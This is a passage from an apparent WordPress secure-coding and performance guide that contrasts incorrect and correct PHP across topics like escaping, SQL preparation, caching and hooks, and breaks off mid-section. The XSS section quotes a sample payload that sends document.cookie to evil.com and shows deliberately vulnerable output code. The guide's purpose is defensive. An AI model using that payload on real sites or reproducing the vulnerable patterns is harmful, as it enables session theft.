**For LIKE queries**, always use `$wpdb->esc_like()` to escape `%` and `_` wildcards in the search term, then wrap with `%` outside.

**Detection hints:**

```bash
# Find $wpdb calls without prepare()
grep -rn "\$wpdb->query\|\$wpdb->get_results\|\$wpdb->get_row\|\$wpdb->get_var" wp-content/plugins/ --include="*.php" | grep -v "prepare"
# Find variable interpolation inside SQL strings
grep -rn "\$wpdb->.*\"SELECT.*\\\$" wp-content/plugins/ --include="*.php"
```

Reference: [wpdb::prepare()](https://developer.wordpress.org/reference/classes/wpdb/prepare/) · [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

---

## Escape All Output with the Correct Context Function

**Impact: CRITICAL (prevents cross-site scripting enabling session hijacking, admin takeover, and defacement)**

WordPress provides context-specific escaping functions. Every piece of dynamic data rendered in HTML must be escaped with the function that matches its output context. Using `esc_html()` inside an `href` attribute does not prevent `javascript:` URI injection — you need `esc_url()`. Using no escaping at all is the #1 source of WordPress XSS vulnerabilities.

**The rule: escape late, escape with the right function for the context.**

**Incorrect (raw output or wrong escaping function):**

```php
// ❌ Raw user input echoed — classic reflected XSS
echo '<input type="text" value="' . $_GET['search'] . '">';
// Attacker: ?search="><script>document.location='https://evil.com/?c='+document.cookie</script>

// ❌ Option value echoed without escaping — stored XSS
echo '<h2>' . get_option( 'widget_title' ) . '</h2>';

// ❌ Wrong function for URL context — esc_html doesn't block javascript: URIs
echo '<a href="' . esc_html( $user_submitted_url ) . '">Link</a>';
// Attacker submits: javascript:alert(document.cookie) → esc_html() passes it through

// ❌ Trusting post meta (any editor can set arbitrary meta values)
echo '<div class="' . get_post_meta( $post->ID, 'custom_class', true ) . '">';
```

**Correct (right escaping function for each context):**

```php
// ✅ HTML attribute context → esc_attr()
echo '<input type="text" value="' . esc_attr( $_GET['search'] ) . '">';

// ✅ HTML text content → esc_html()
echo '<h2>' . esc_html( get_option( 'widget_title' ) ) . '</h2>';

// ✅ URL context → esc_url() (blocks javascript:, data:, and invalid protocols)
echo '<a href="' . esc_url( $user_submitted_url ) . '">Link</a>';

// ✅ CSS class → sanitize_html_class() or esc_attr()
echo '<div class="' . esc_attr( get_post_meta( $post->ID, 'custom_class', true ) ) . '">';

// ✅ JavaScript string → esc_js() (only for inline JS, not recommended)
echo '<script>var title = "' . esc_js( $title ) . '";</script>';

// ✅ Rich HTML that should allow some tags → wp_kses_post()
echo wp_kses_post( $user_bio );

// ✅ Custom allowed tags → wp_kses()
$allowed = [
    'a'      => [ 'href' => [], 'title' => [] ],
    'strong' => [],
    'em'     => [],
];
echo wp_kses( $comment_html, $allowed );
```

**Escaping function decision tree:**

| Output Context | Function | Blocks |
|---------------|----------|--------|
| Between HTML tags | `esc_html()` | `<script>`, HTML tags |
| Inside `=""` attribute | `esc_attr()` | Quote breaking, event handlers |
| Inside `href=""` or `src=""` | `esc_url()` | `javascript:`, `data:`, bad protocols |
| Textarea content | `esc_textarea()` | Tag injection in textareas |
| Inline JS string | `esc_js()` | Quote breaking in JS |
| Rich HTML (post content) | `wp_kses_post()` | Dangerous tags, keeps safe HTML |
| Custom HTML subset | `wp_kses($data, $allowed)` | Everything not in allowlist |

**Translated strings must also be escaped:**

```php
// ❌ Translators can inject HTML via translation files
echo __( 'Welcome back!', 'my-plugin' );
_e( 'Settings saved.', 'my-plugin' );

// ✅ Always use the escaped variants for output
echo esc_html__( 'Welcome back!', 'my-plugin' );
esc_html_e( 'Settings saved.', 'my-plugin' );
echo '<input placeholder="' . esc_attr__( 'Search...', 'my-plugin' ) . '">';
```

**Detection hints:**

```bash
# Find direct echo of superglobals
grep -rn "echo.*\\\$_\(GET\|POST\|REQUEST\|COOKIE\|SERVER\)" wp-content/plugins/ --include="*.php"
# Find echo without escaping function
grep -rn "echo.*get_option\|echo.*get_post_meta\|echo.*get_user_meta" wp-content/plugins/ --include="*.php" | grep -v "esc_\|wp_kses"
# Find _e() without esc_ wrapper
grep -rn "\b_e\s*(" wp-content/plugins/ --include="*.php"
```

Reference: [WordPress Escaping](https://developer.wordpress.org/apis/security/escaping/) · [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)

---

## Disable Autoload for Large or Infrequently Used Options

**Impact: HIGH (reduces memory usage and page load time by preventing megabytes of unused data from loading on every request)**

WordPress runs `SELECT option_name, option_value FROM wp_options WHERE autoload = 'yes'` on **every single page load** — before any plugin code executes. Every option created with `add_option()` defaults to `autoload = 'yes'`. If plugins store large serialized arrays, cached API responses, or log data as autoloaded options, this single query can load megabytes of unnecessary data into memory on every request.

WordPress VIP and managed hosts flag anything above 1MB of autoloaded options as a performance problem.

**Incorrect (large data in autoloaded options):**

```php
// ❌ add_option() defaults to autoload=yes — this loads on EVERY page
add_option( 'my_plugin_cached_products', $huge_product_array );
// If this is 500KB, it's loaded and deserialized on every request

// ❌ update_option() inherits autoload=yes from the existing option
update_option( 'my_plugin_analytics_log', $growing_log_array );
// Log grows over time → autoloaded data grows → every page gets slower

// ❌ Storing entire API responses as options
$api_data = wp_remote_retrieve_body( wp_remote_get( 'https://api.example.com/catalog' ) );
update_option( 'my_plugin_catalog_cache', json_decode( $api_data, true ) );
// Could be megabytes of data, loaded on every request
```

**Correct (explicit autoload control):**

```php
// ✅ Disable autoload for large or infrequently used data
add_option( 'my_plugin_cached_products', $product_array, '', 'no' );
// Fourth parameter = deprecated, fifth = autoload

// ✅ For WordPress 6.6+: update_option accepts autoload parameter
update_option( 'my_plugin_catalog_cache', $data, false ); // autoload=false

// ✅ For existing options, fix autoload status
global $wpdb;
$wpdb->update(
    $wpdb->options,
    [ 'autoload' => 'no' ],
    [ 'option_name' => 'my_plugin_cached_products' ]
);

// ✅ Small, frequently needed settings: autoload is fine (the default)
add_option( 'my_plugin_api_key', $api_key );           // Small string, needed on every request
add_option( 'my_plugin_enabled', 'yes' );               // Tiny value, checked constantly

// ✅ Use transients instead of options for cached data
// Transients have built-in expiration and can use persistent object cache
set_transient( 'my_plugin_catalog', $data, HOUR_IN_SECONDS );
```

**Decision tree — autoload yes or no?**

| Data type | Autoload | Reason |
|-----------|----------|--------|
| API key, feature flag, small config | `yes` | Small, needed on most requests |
| Plugin version, installed date | `yes` | Tiny values |
| Cached API responses | `no` (or transient) | Large, only needed on specific pages |
| Analytics/log data | `no` | Grows over time, only needed in admin |
| Serialized arrays > 10KB | `no` | Too large for every-request loading |
| Data only used in admin pages | `no` | Not needed on frontend requests |

**Audit existing autoloaded options:**

```sql
-- Find the largest autoloaded options
SELECT option_name, LENGTH(option_value) as size
FROM wp_options
WHERE autoload = 'yes'
ORDER BY size DESC
LIMIT 20;

-- Total autoloaded data size
SELECT SUM(LENGTH(option_value)) / 1024 / 1024 as total_mb
FROM wp_options
WHERE autoload = 'yes';
```

**Detection hints:**

```bash
# Find add_option without explicit autoload=no
grep -rn "add_option\s*(" wp-content/plugins/ --include="*.php" | grep -v "'no'\s*)"
# Find update_option storing arrays (likely large)
grep -rn "update_option.*\\\$.*array\|update_option.*json_decode" wp-content/plugins/ --include="*.php"
```

Reference: [Options API](https://developer.wordpress.org/plugins/settings/options-api/) · [WordPress VIP: Autoloaded Options](https://docs.wpvip.com/wordpress-on-vip/code-review/autoloaded-options/)

---

## Avoid N+1 Queries in Post Loops

**Impact: HIGH (reduces database queries from N+1 to 2 in post loops, critical for archive pages)**

When you loop through posts and call `get_post_meta()` for each one, WordPress executes a separate database query per post — unless the meta cache has been primed. With 50 posts, that's 51 queries instead of 2. On archive pages, category pages, and search results, this is the single most impactful query anti-pattern in WordPress.

**Incorrect (N+1 queries):**

```php
// ❌ Explicitly disabling meta cache priming, then reading meta in loop
$query = new WP_Query([
    'post_type'              => 'product',
    'posts_per_page'         => 50,
    'update_post_meta_cache' => false, // Disables bulk cache prime
]);

while ( $query->have_posts() ) {
    $query->the_post();
    $price = get_post_meta( get_the_ID(), '_price', true );    // Query #2
    $sku   = get_post_meta( get_the_ID(), '_sku', true );      // Query #3
    $stock = get_post_meta( get_the_ID(), '_stock', true );     // Query #4
    // × 50 posts = 150 extra queries!
    echo esc_html( "$sku: $$price ($stock in stock)" );
}

// ❌ get_posts() with suppress_filters disabling cache
$posts = get_posts([
    'post_type'              => 'product',
    'numberposts'            => 100,
    'update_post_meta_cache' => false,
]);
foreach ( $posts as $post ) {
    $featured_image = get_post_thumbnail_id( $post->ID ); // 1 query per post
}
```

**Correct (cache-primed queries):**

```php
// ✅ Keep update_post_meta_cache enabled (the default)
// WordPress runs one bulk query: SELECT * FROM wp_postmeta WHERE post_id IN (1,2,3,...)
$query = new WP_Query([
    'post_type'              => 'product',
    'posts_per_page'         => 50,
    'update_post_meta_cache' => true,  // Default — primes meta cache in one query
]);

while ( $query->have_posts() ) {
    $query->the_post();
    $price = get_post_meta( get_the_ID(), '_price', true );    // Cache hit — no query
    $sku   = get_post_meta( get_the_ID(), '_sku', true );      // Cache hit — no query
    echo esc_html( "$sku: $$price" );
}
```

```php
// ✅ When you only need posts matching specific meta values, use meta_query
$query = new WP_Query([
    'post_type'      => 'product',
    'posts_per_page' => 50,
    'meta_query'     => [
        [
            'key'     => '_price',
            'value'   => 100,
            'compare' => '>=',
            'type'    => 'NUMERIC',
        ],
        [
            'key'     => '_stock',
            'value'   => 0,
            'compare' => '>',
            'type'    => 'NUMERIC',
        ],
    ],
]);
```

```php
// ✅ Manually prime meta cache for a custom set of post IDs
$post_ids = [ 1, 2, 3, 4, 5 ];
update_meta_cache( 'post', $post_ids ); // One bulk query for all

foreach ( $post_ids as $id ) {
    $title = get_post_meta( $id, 'custom_title', true ); // All cache hits
}

// ✅ Disable term cache if you don't need terms (save one query)
$query = new WP_Query([
    'post_type'              => 'product',
    'posts_per_page'         => 50,
    'update_post_term_cache' => false, // Skip if not displaying categories/tags
    'no_found_rows'          => true,  // Skip SQL_CALC_FOUND_ROWS if no pagination
]);
```

**Query optimization reference:**

| WP_Query arg | Default | Set to | Saves |
|-------------|---------|--------|-------|
| `update_post_meta_cache` | `true` | Keep `true` | N meta queries → 1 bulk |
| `update_post_term_cache` | `true` | `false` if unused | 1 term query |
| `no_found_rows` | `false` | `true` if no pagination | 1 COUNT query |
| `fields` | `all` | `'ids'` if only IDs needed | Reduced memory |

**Detection hints:**

```bash
# Find loops with meta calls that might be N+1
grep -rn "get_post_meta" wp-content/plugins/ wp-content/themes/ --include="*.php" -l | xargs grep -l "have_posts\|foreach.*\$posts"
# Find queries with disabled meta cache
grep -rn "update_post_meta_cache.*false" wp-content/ --include="*.php"
```

Reference: [WP_Query](https://developer.wordpress.org/reference/classes/wp_query/) · [update_meta_cache()](https://developer.wordpress.org/reference/functions/update_meta_cache/)

---

## Use Object Cache for Repeated Expensive Queries

**Impact: MEDIUM (eliminates repeated database queries for frequently accessed data across multiple requests)**

WordPress has a built-in object cache (`wp_cache_get`/`wp_cache_set`) that stores data in memory during a single request. With a persistent backend like Redis or Memcached (via an `object-cache.php` drop-in), cached data survives across requests — identical queries return instantly without hitting the database.

**Incorrect (repeated queries with no caching):**

```php
// ❌ Runs full WP_Query on every call, every page load
function get_featured_products() {
    return new WP_Query([
        'post_type'  => 'product',
        'meta_key'   => '_featured',
        'meta_value' => 'yes',
        'posts_per_page' => 20,
    ]);
}

// Called in header, sidebar, and footer — 3 identical queries per page
get_featured_products();
get_featured_products();
get_featured_products();

// ❌ Expensive count query on every page load
function get_pending_orders_count() {
    global $wpdb;
    return $wpdb->get_var(
        "SELECT COUNT(*) FROM {$wpdb->posts} WHERE post_type = 'shop_order' AND post_status = 'wc-pending'"
    );
}
```

**Correct (wrap with wp_cache_get/set):**

```php
// ✅ Cache query results with a group and expiration
function get_featured_products() {
    $cache_key   = 'featured_products_v1';
    $cache_group = 'my_plugin';

    $cached = wp_cache_get( $cache_key, $cache_group );
    if ( false !== $cached ) {
        return $cached;
    }

    $query = new WP_Query([
        'post_type'      => 'product',
        'meta_key'       => '_featured',
        'meta_value'     => 'yes',
        'posts_per_page' => 20,
        'no_found_rows'  => true, // Skip SQL_CALC_FOUND_ROWS
    ]);

    $posts = $query->posts;
    wp_cache_set( $cache_key, $posts, $cache_group, HOUR_IN_SECONDS );

    return $posts;
}

// ✅ Invalidate when data changes
function invalidate_featured_cache( $post_id ) {
    if ( 'product' === get_post_type( $post_id ) ) {
        wp_cache_delete( 'featured_products_v1', 'my_plugin' );
    }
}
add_action( 'save_post', 'invalidate_featured_cache' );
add_action( 'deleted_post', 'invalidate_featured_cache' );
```

```php
// ✅ Cache expensive count queries
function get_pending_orders_count() {
    $cached = wp_cache_get( 'pending_orders_count', 'my_plugin' );
    if ( false !== $cached ) {
        return $cached;
    }

    global $wpdb;
    $count = (int) $wpdb->get_var(
        $wpdb->prepare(
            "SELECT COUNT(*) FROM {$wpdb->posts} WHERE post_type = %s AND post_status = %s",
            'shop_order',
            'wc-pending'
        )
    );

    wp_cache_set( 'pending_orders_count', $count, 'my_plugin', 5 * MINUTE_IN_SECONDS );
    return $count;
}
```

**Object cache vs transients:**

| Feature | `wp_cache_*` | `set_transient()` |
|---------|-------------|-------------------|
| Storage without backend | In-memory (single request only) | `wp_options` table |
| Storage with Redis/Memcached | Persistent across requests | Persistent (uses object cache) |
| Expiration | Yes | Yes |
| Best for | Repeated queries within/across requests | External API caches, data rarely read |
| Overhead | Near-zero | DB write on miss |

**Detection hints:**

```bash
# Find WP_Query/get_posts without nearby caching
grep -rn "new WP_Query\|get_posts\s*(" wp-content/plugins/ --include="*.php" -l | xargs grep -L "wp_cache_get\|get_transient"
```

Reference: [WP_Object_Cache](https://developer.wordpress.org/reference/classes/wp_object_cache/) · [WordPress Object Caching](https://developer.wordpress.org/advanced-administration/performance/cache/)

---

## Enqueue Scripts and Styles Properly with Conditional Loading

**Impact: HIGH (reduces unnecessary HTTP requests and JavaScript parse time on pages that don't need plugin assets)**

WordPress provides `wp_enqueue_script()` and `wp_enqueue_style()` to manage JavaScript and CSS with dependency resolution, versioned cache busting, and conditional loading. Outputting `<script>` or `<link>` tags directly in templates or via `wp_head` bypasses all of this — scripts can't be dequeued by other plugins, dependencies aren't resolved, and assets load on every page.

**Incorrect (direct output and unconditional loading):**

```php
// ❌ Direct HTML output — bypasses dependency system
function my_plugin_head() {
    echo '<script src="' . plugin_dir_url( __FILE__ ) . 'js/slider.js"></script>';
    echo '<link rel="stylesheet" href="' . plugin_dir_url( __FILE__ ) . 'css/slider.css">';
}
add_action( 'wp_head', 'my_plugin_head' );

// ❌ Loading on every page when only needed on one
function my_plugin_enqueue() {
    wp_enqueue_script( 'my-gallery', plugin_dir_url( __FILE__ ) . 'gallery.js', [ 'jquery' ] );
    wp_enqueue_style( 'my-gallery-css', plugin_dir_url( __FILE__ ) . 'gallery.css' );
}
add_action( 'wp_enqueue_scripts', 'my_plugin_enqueue' );
// ^ Loads gallery JS + CSS on blog posts, checkout, contact — everywhere

// ❌ Missing version parameter — browser uses stale cached version after updates
wp_enqueue_script( 'my-script', plugin_dir_url( __FILE__ ) . 'script.js' );
// Third param defaults to [] deps, fourth defaults to false (no version)

// ❌ Loading in <head> when footer is fine
wp_enqueue_script( 'my-script', $url, [], '1.0', false );
// false = load in <head> = render-blocking
```

**Correct (conditional loading with proper options):**

```php
// ✅ Conditional frontend loading — only on pages that use the feature
function my_plugin_enqueue() {
    // Only load gallery on the portfolio page
    if ( ! is_page( 'portfolio' ) && ! is_page_template( 'template-gallery.php' ) ) {
        return;
    }

    wp_enqueue_script(
        'my-gallery',                              // Handle (unique ID)
        plugin_dir_url( __FILE__ ) . 'gallery.js', // URL
        [ 'jquery' ],                              // Dependencies
        '2.1.0',                                   // Version (cache busting)
        true                                       // Load in footer (non-blocking)
    );

    wp_enqueue_style(
        'my-gallery-css',
        plugin_dir_url( __FILE__ ) . 'gallery.css',
        [],         // No CSS dependencies
        '2.1.0'
    );

    // Pass PHP data to JavaScript safely
    wp_localize_script( 'my-gallery', 'galleryConfig', [
        'ajaxUrl' => admin_url( 'admin-ajax.php' ),
        'nonce'   => wp_create_nonce( 'gallery_nonce' ),
        'perPage' => 12,
    ]);
}
add_action( 'wp_enqueue_scripts', 'my_plugin_enqueue' );
```

```php
// ✅ Admin scripts — only on your plugin's admin page
function my_plugin_admin_enqueue( $hook ) {
    // $hook is the admin page slug — only load on YOUR settings page
    if ( 'settings_page_my-plugin-settings' !== $hook ) {
        return;
    }

    wp_enqueue_script( 'my-admin', plugin_dir_url( __FILE__ ) . 'admin.js', [], '1.0', true );
    wp_enqueue_style( 'my-admin-css', plugin_dir_url( __FILE__ ) . 'admin.css', [], '1.0' );
}
add_action( 'admin_enqueue_scripts', 'my_plugin_admin_enqueue' );
```

```php
// ✅ Shortcode-triggered loading — only load when shortcode is used
function my_chart_shortcode( $atts ) {
    // Enqueue only when the shortcode is actually rendered
    wp_enqueue_script( 'chart-js', plugin_dir_url( __FILE__ ) . 'chart.js', [], '4.0', true );
    wp_enqueue_style( 'chart-css', plugin_dir_url( __FILE__ ) . 'chart.css', [], '4.0' );

    return '<div class="my-chart" data-type="' . esc_attr( $atts['type'] ?? 'bar' ) . '"></div>';
}
add_shortcode( 'my_chart', 'my_chart_shortcode' );
```

**Enqueue best practices:**

| Practice | Why |
|----------|-----|
| Always set `true` for in_footer (5th param) | Non-blocking, better FCP |
| Always set a version string | Cache busting on updates |
| Conditional loading with `is_page()`, `is_singular()`, etc. | Fewer requests on unrelated pages |
| Use `admin_enqueue_scripts` hook for admin | Don't load admin assets on frontend |
| Use `wp_localize_script()` for PHP→JS data | Safe, properly escaped |

**Detection hints:**

```bash
# Find direct script/style output (should use enqueue)
grep -rn "echo.*<script\|echo.*<link.*stylesheet" wp-content/plugins/ --include="*.php"
# Find unconditional enqueue (missing is_page, is_singular, etc.)
grep -rn "wp_enqueue_scripts.*function" wp-content/plugins/ --include="*.php" -A 5 | grep -v "is_page\|is_singular\|is_admin\|return"
```

Reference: [wp_enqueue_script()](https://developer.wordpress.org/reference/functions/wp_enqueue_script/) · [Including CSS & JavaScript](https://developer.wordpress.org/plugins/javascript/enqueuing/)

---

## Keep Database Queries Out of Templates — Use pre_get_posts

**Impact: HIGH (eliminates redundant database queries and ORDER BY RAND() full table scans in templates)**

Template files (`single.php`, `archive.php`, template parts) should only render data — not fetch it. Direct `$wpdb` queries and `query_posts()` in templates cause:

- **`query_posts()`** overwrites the main query, wasting the original SQL query and breaking pagination
- **Direct `$wpdb`** queries bypass object caching, capability filtering, and post status checks
- **`ORDER BY RAND()`** causes a full table scan with filesort — catastrophic on large tables

**Incorrect (queries in templates):**

```php
<!-- single.php -->
<?php
// ❌ query_posts() overwrites the main query — the original query was wasted
query_posts( 'post_type=product&posts_per_page=10' );
while ( have_posts() ) : the_post();
    the_title();
endwhile;
// Pagination is broken, global state is corrupted
?>

<!-- sidebar.php -->
<?php
// ❌ Direct SQL in template — bypasses caching and object permissions
global $wpdb;
$popular = $wpdb->get_results(
    "SELECT ID, post_title FROM wp_posts
     WHERE post_type = 'post' AND post_status = 'publish'
     ORDER BY RAND() LIMIT 5"
);
// ORDER BY RAND() = full table scan on every page load
?>

<!-- archive.php -->
<?php
// ❌ Custom query overriding the main loop instead of modifying it
$custom = new WP_Query([
    'post_type'      => 'post',
    'posts_per_page' => 12,
    'category_name'  => 'featured',
]);
// The original archive query already ran and was thrown away
?>
```

**Correct (modify main query via pre_get_posts or use secondary queries properly):**

```php
// functions.php — modify the main query BEFORE it runs
function my_theme_customize_main_query( WP_Query $query ) {
    if ( is_admin() || ! $query->is_main_query() ) {
        return; // Only modify the main frontend query
    }

    // Customize archive pages
    if ( $query->is_archive() ) {
        $query->set( 'posts_per_page', 12 );
    }

    // Customize category pages
    if ( $query->is_category( 'featured' ) ) {
        $query->set( 'orderby', 'date' );
        $query->set( 'order', 'DESC' );
    }

    // Customize search
    if ( $query->is_search() ) {
        $query->set( 'post_type', [ 'post', 'page', 'product' ] );
    }
}
add_action( 'pre_get_posts', 'my_theme_customize_main_query' );
```

```php
// ✅ When a secondary query IS needed (sidebar widgets, related posts),
// use WP_Query (NEVER query_posts) and reset properly
<?php
$related = new WP_Query([
    'post_type'      => 'post',
    'posts_per_page' => 5,
    'post__not_in'   => [ get_the_ID() ],
    'category__in'   => wp_get_post_categories( get_the_ID() ),
    'no_found_rows'  => true, // Skip pagination count — saves one query
]);

if ( $related->have_posts() ) :
    while ( $related->have_posts() ) : $related->the_post();
        get_template_part( 'template-parts/card' );
    endwhile;
    wp_reset_postdata(); // Always reset after secondary WP_Query loops
endif;
?>
```

```php
// ✅ Instead of ORDER BY RAND(), use a cached random selection
function get_random_posts_cached( $count = 5 ) {
    $cache_key = 'random_posts_' . $count;
    $cached = get_transient( $cache_key );

    if ( false !== $cached ) {
        return $cached;
    }

    $posts = get_posts([
        'post_type'   => 'post',
        'numberposts' => $count,
        'orderby'     => 'rand',
        'no_found_rows' => true,
    ]);

    set_transient( $cache_key, $posts, 15 * MINUTE_IN_SECONDS );
    return $posts;
}
```

**Detection hints:**

```bash
# Find query_posts (almost always wrong)
grep -rn "query_posts\s*(" wp-content/themes/ wp-content/plugins/ --include="*.php"
# Find direct $wpdb in template files
grep -rn "\$wpdb->" wp-content/themes/ --include="*.php"
# Find ORDER BY RAND
grep -rn "ORDER BY RAND\|orderby.*rand" wp-content/ --include="*.php"
```

Reference: [pre_get_posts](https://developer.wordpress.org/reference/hooks/pre_get_posts/) · [When to use WP_Query vs query_posts](https://developer.wordpress.org/reference/functions/query_posts/)

---

## Cache Expensive Operations with Transients

**Impact: HIGH (reduces page load time by 200-2000ms for pages making external API calls or complex queries)**

WordPress transients are key-value pairs with an expiration time, stored in `wp_options` (or in a persistent object cache like Redis if configured). Any operation that is slow and returns the same result for a period of time should be cached: external API calls, complex database aggregations, third-party SDK queries, and computationally expensive transformations.

**Incorrect (uncached expensive operations on every request):**

```php
// ❌ HTTP request on every page load — 200-2000ms latency each time
function get_exchange_rates() {
    $response = wp_remote_get( 'https://api.exchangerate.host/latest' );
    if ( is_wp_error( $response ) ) {
        return [];
    }
    return json_decode( wp_remote_retrieve_body( $response ), true );
}

// ❌ Complex aggregation query on every request
function get_sales_stats() {
    global $wpdb;
    return $wpdb->get_results(
        "SELECT DATE(post_date) as date, COUNT(*) as orders, SUM(meta_value) as revenue
         FROM {$wpdb->posts} p
         JOIN {$wpdb->postmeta} pm ON p.ID = pm.post_id AND pm.meta_key = '_order_total'
         WHERE p.post_type = 'shop_order' AND p.post_status = 'wc-completed'
         GROUP BY DATE(post_date)
         ORDER BY date DESC
         LIMIT 30"
    );
    // Runs a JOIN + GROUP BY on every page load
}
```

**Correct (transient caching with proper patterns):**

```php
// ✅ Cache external API calls
function get_exchange_rates() {
    $cache_key = 'my_plugin_exchange_rates';
    $cached = get_transient( $cache_key );

    if ( false !== $cached ) {
        return $cached; // Cache hit
    }

    $response = wp_remote_get( 'https://api.exchangerate.host/latest', [
        'timeout' => 10,
    ]);

    if ( is_wp_error( $response ) ) {
        // On failure, try to use expired cache (stale-while-revalidate pattern)
        $stale = get_option( '_transient_stale_' . $cache_key );
        return $stale ?: [];
    }

    $data = json_decode( wp_remote_retrieve_body( $response ), true );

    // Cache for 1 hour; store a stale copy as backup
    set_transient( $cache_key, $data, HOUR_IN_SECONDS );
    update_option( '_transient_stale_' . $cache_key, $data, 'no' ); // autoload=no

    return $data;
}
```

```php
// ✅ Cache complex queries with cache invalidation on data change
function get_sales_stats() {
    $cache_key = 'my_plugin_sales_stats';
    $cached = get_transient( $cache_key );

    if ( false !== $cached ) {
        return $cached;
    }

    global $wpdb;
    $results = $wpdb->get_results(
        $wpdb->prepare(
            "SELECT DATE(post_date) as date, COUNT(*) as orders, SUM(meta_value) as revenue
             FROM {$wpdb->posts} p
             JOIN {$wpdb->postmeta} pm ON p.ID = pm.post_id AND pm.meta_key = %s
             WHERE p.post_type = %s AND p.post_status = %s
             GROUP BY DATE(post_date)
             ORDER BY date DESC
             LIMIT 30",
            '_order_total',
            'shop_order',
            'wc-completed'
        )
    );

    set_transient( $cache_key, $results, 15 * MINUTE_IN_SECONDS );
    return $results;
}

// Invalidate when new orders are placed
add_action( 'woocommerce_order_status_completed', function() {
    delete_transient( 'my_plugin_sales_stats' );
});
```

**WordPress time constants:**

| Constant | Seconds |
|----------|---------|
| `MINUTE_IN_SECONDS` | 60 |
| `HOUR_IN_SECONDS` | 3,600 |
| `DAY_IN_SECONDS` | 86,400 |
| `WEEK_IN_SECONDS` | 604,800 |

**When NOT to use transients:**

- Data that changes on every request (user-specific session data)
- Small/fast operations (a single indexed query is faster than transient overhead)
- Sensitive data (transients are stored in `wp_options`, accessible on shared object caches)

**Detection hints:**

```bash
# Find API calls without transient caching
grep -rn "wp_remote_get\|wp_remote_post" wp-content/plugins/ --include="*.php" -l | xargs grep -L "get_transient\|set_transient"
# Find complex queries without caching
grep -rn "GROUP BY\|JOIN.*JOIN\|UNION" wp-content/plugins/ --include="*.php" -l | xargs grep -L "transient\|wp_cache"
```

Reference: [Transients API](https://developer.wordpress.org/apis/transients/) · [WordPress Performance Best Practices](https://developer.wordpress.org/advanced-administration/performance/)

---

## Use WordPress Path and URL Functions — Never Hardcode

**Impact: MEDIUM (prevents broken paths across environments, subdirectory installs, and multisite configurations)**

WordPress can be installed in a subdirectory, with a custom `wp-content` directory, or as a multisite network. Hardcoded URLs and filesystem paths break in all of these configurations and when moving between local, staging, and production environments.

**Incorrect (hardcoded paths and URLs):**

```php
// ❌ Hardcoded domain — breaks on staging, local dev, and domain changes
$logo = 'https://example.com/wp-content/themes/my-theme/images/logo.png';
$ajax = 'https://example.com/wp-admin/admin-ajax.php';
$home = 'https://example.com/';

// ❌ Hardcoded filesystem path — breaks on different servers
require_once '/var/www/html/wp-content/plugins/my-plugin/includes/helpers.php';
$upload_path = '/var/www/html/wp-content/uploads/';

// ❌ Assuming wp-content is in the default location
$plugin_url = get_site_url() . '/wp-content/plugins/my-plugin/assets/style.css';
// Breaks if WP_CONTENT_DIR is customized
```

**Correct (WordPress path and URL functions):**

```php
// ✅ Theme URLs and paths
$logo = get_template_directory_uri() . '/images/logo.png';          // Parent theme URL
$logo = get_stylesheet_directory_uri() . '/images/logo.png';       // Child theme URL
$path = get_template_directory() . '/includes/helpers.php';         // Parent theme filesystem
$path = get_stylesheet_directory() . '/includes/helpers.php';       // Child theme filesystem

// ✅ Plugin URLs and paths
$asset_url  = plugin_dir_url( __FILE__ ) . 'assets/style.css';     // Plugin asset URL
$asset_url  = plugins_url( 'assets/style.css', __FILE__ );         // Same, different syntax
$plugin_dir = plugin_dir_path( __FILE__ );                          // Plugin filesystem path (trailing /)
require_once plugin_dir_path( __FILE__ ) . 'includes/helpers.php';

// ✅ Site URLs
$home     = home_url( '/' );                    // Frontend homepage
$site     = site_url( '/wp-login.php' );        // WordPress install URL
$admin    = admin_url( 'admin-ajax.php' );      // Admin URL
$ajax_url = admin_url( 'admin-ajax.php' );      // Correct AJAX endpoint

// ✅ Upload directory
$upload_dir = wp_upload_dir();
$base_path  = $upload_dir['basedir'];  // /var/www/html/wp-content/uploads
$base_url   = $upload_dir['baseurl'];  // https://example.com/wp-content/uploads

// ✅ WordPress core paths
$abspath       = ABSPATH;                    // WordPress root
$content_dir   = WP_CONTENT_DIR;             // wp-content filesystem path
$content_url   = content_url();              // wp-content URL
$includes_dir  = ABSPATH . WPINC . '/';      // wp-includes filesystem path
```

**Quick reference:**

| Need | Function |
|------|----------|
| Theme asset URL | `get_template_directory_uri()` |
| Child theme asset URL | `get_stylesheet_directory_uri()` |
| Plugin asset URL | `plugins_url( 'file.js', __FILE__ )` |
| Plugin directory path | `plugin_dir_path( __FILE__ )` |
| Homepage URL | `home_url( '/' )` |
| Admin URL | `admin_url( 'page.php' )` |
| AJAX endpoint | `admin_url( 'admin-ajax.php' )` |
| REST API base | `rest_url( 'namespace/v1/' )` |
| Upload directory | `wp_upload_dir()` |

**Detection hints:**

```bash
# Find hardcoded domain URLs to wp-content
grep -rn "https\?://.*wp-content" wp-content/plugins/ wp-content/themes/ --include="*.php"
# Find hardcoded filesystem paths
grep -rn "/var/www\|/home/[a-z]" wp-content/plugins/ wp-content/themes/ --include="*.php"
```

Reference: [Determining Plugin and Content Directories](https://developer.wordpress.org/plugins/plugin-basics/determining-plugin-and-content-directories/)

---

## Use the Correct WordPress Hook for Each Operation

**Impact: MEDIUM (prevents wasted queries on frontend, failed registrations from wrong timing, and race conditions)**

WordPress hooks fire in a specific order. Using the wrong hook causes subtle bugs: CPTs registered too early don't get rewrite rules, scripts enqueued on `init` miss the proper output hooks, and admin-only logic running on `init` wastes resources on every frontend request.

**WordPress hook execution order:**

```
muplugins_loaded → plugins_loaded → init → widgets_init → wp_loaded
                                                             ↓
                                              (admin only): admin_menu → admin_init
                                              (frontend):   wp → template_redirect → wp_enqueue_scripts → wp_head → [content] → wp_footer
```

**Incorrect (wrong hooks for the operation):**

```php
// ❌ CPT on plugins_loaded — too early, rewrite rules not initialized
add_action( 'plugins_loaded', function() {
    register_post_type( 'product', [ ... ] );
});

// ❌ Enqueueing scripts on init — wrong hook, doesn't respect frontend/admin split
add_action( 'init', function() {
    wp_enqueue_script( 'my-script', plugin_dir_url( __FILE__ ) . 'script.js' );
});

// ❌ Admin-only processing on init — runs on EVERY request including frontend
add_action( 'init', function() {
    if ( isset( $_POST['my_action'] ) ) {
        // This check runs on every frontend page load too
        update_option( 'my_setting', sanitize_text_field( $_POST['my_setting'] ) );
    }
});

// ❌ Adding admin menu on init — too early, admin_menu hasn't fired
add_action( 'init', function() {
    add_options_page( 'My Plugin', 'My Plugin', 'manage_options', 'my-plugin', 'render_page' );
});
```

**Correct (right hook for each operation):**

```php
// ✅ CPT and taxonomy registration: init
